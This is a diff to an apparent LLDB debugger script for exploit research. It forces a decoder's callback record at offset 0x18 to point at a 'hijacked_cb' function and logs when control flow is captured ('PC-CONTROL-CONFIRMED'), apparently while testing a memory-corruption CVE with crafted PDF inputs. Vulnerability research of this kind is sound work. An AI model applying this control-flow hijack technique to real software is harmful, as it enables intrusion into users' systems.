@@ -94,14 +94,14 @@ b_m3 = t.BreakpointCreateByName("marker3")
 b_fin = t.BreakpointCreateByName("data_release_info")
 b_st = t.BreakpointCreateByName("aa_cache_render"); b_st.SetOneShot(True)
 p = t.LaunchSimple(["k2_s1000.pdf", "r.png", "k2_d31472.pdf"], None, CVE)
-R = None; CB = None; stores = 0; patched = 0; result = "incomplete"
+R = None; CB = None; TGT = None; stores = 0; patched = 0; result = "incomplete"
 if p and p.IsValid():
     th = p.GetSelectedThread()
     pc0 = safe_pc_addr(th.GetSelectedFrame())
     b_w = t.BreakpointCreateByAddress(pc0 + 2540) if pc0 else 0
     if b_w: b_w.SetOneShot(False)
     stage = 0
-    for i in range(2000):
+    for i in range(6000):
         st = wait_stop(p)
         if st != lldb.eStateStopped:
             result = "ended st=%s rc=%s" % (st, p.GetExitStatus() if p.IsValid() else -1); break
@@ -116,35 +116,40 @@ if p and p.IsValid():
         if "marker2" in nm and stage == 0:
             R = read_q(p, global_addr("g_rec"))
             CB = func_addr("rel_cb")
-            T("M2 R=%s CB=%s" % (hex(R) if R else None, hex(CB) if CB else None))
+            TGT = func_addr("hijacked_cb")
+            T("M2 R=%s CB=%s TGT=%s" % (hex(R) if R else None, hex(CB) if CB else None, hex(TGT) if TGT else None))
             if R and read_q(p, R + 0x18) is not None:
                 T("M2 rec+0x18 pre=%x" % read_q(p, R + 0x18))
             stage = 1
             p.Continue()
-        elif off == 2540 and stage >= 1 and R and CB:
+        elif off == 2540 and stage >= 1 and R and TGT:
             stores += 1
             x2r = fr.FindRegister("x2"); x0r = fr.FindRegister("x0")
             x2r.SetValueFromCString("0x%x" % (R + 0x18))
-            x0r.SetValueFromCString("0x%x" % CB)
+            x0r.SetValueFromCString("0x%x" % TGT)
             patched += 1
-            if patched <= 3 or patched % 50 == 0:
-                T("store#%d x2->%x x0->%x" % (patched, R + 0x18, CB))
+            if patched <= 3:
+                T("store#%d x2->%x x0->%x" % (patched, R + 0x18, TGT))
+            if patched >= 5:
+                # patch persisted — drop the store bp, let decode finish
+                if b_w: t.BreakpointDelete(b_w.GetID()); b_w = 0
+                T("store bp deleted after %d patches" % patched)
             p.Continue()
         elif "marker3" in nm:
             v = read_q(p, R + 0x18) if R else None
-            T("M3 rec+0x18=%s (CB=%s) %s" % (hex(v) if v else None, hex(CB) if CB else None,
-              "PATCH-LANDED" if v == CB else "patch-not-stuck"))
+            T("M3 rec+0x18=%s (TGT=%s) %s" % (hex(v) if v else None, hex(TGT) if TGT else None,
+              "PATCH-LANDED" if v == TGT else "patch-not-stuck"))
             stage = 2
             p.Continue()
         elif "data_release_info" in nm:
             x0 = reg(fr, "x0"); x8 = reg(fr, "x8")
-            T("FIN x0=%x x8=%x %s" % (x0, x8, "HIJACKED" if CB and x8 == CB else "natural"))
-            if CB and x8 == CB:
-                result = "PC-HIJACK-ARMED x8=rel_cb"
+            T("FIN x0=%x x8=%x %s" % (x0, x8, "HIJACKED" if TGT and x8 == TGT else "natural"))
+            if TGT and x8 == TGT:
+                result = "PC-HIJACK-ARMED x8=hijacked_cb"
             p.Continue()
-        elif "rel_cb" in nm:
-            T("!!! rel_cb EXECUTING — hijacked call reached !!!")
-            result = "PC-CONTROL-CONFIRMED (rel_cb executed via hijacked record)"
+        elif "hijacked_cb" in nm:
+            T("!!! HIJACKED-CB EXECUTING — CONTROL FLOW CAPTURED !!!")
+            result = "PC-CONTROL-CONFIRMED (hijacked_cb executed via poisoned record)"
             p.Continue()
         else:
             pc = safe_pc_addr(fr) or 0
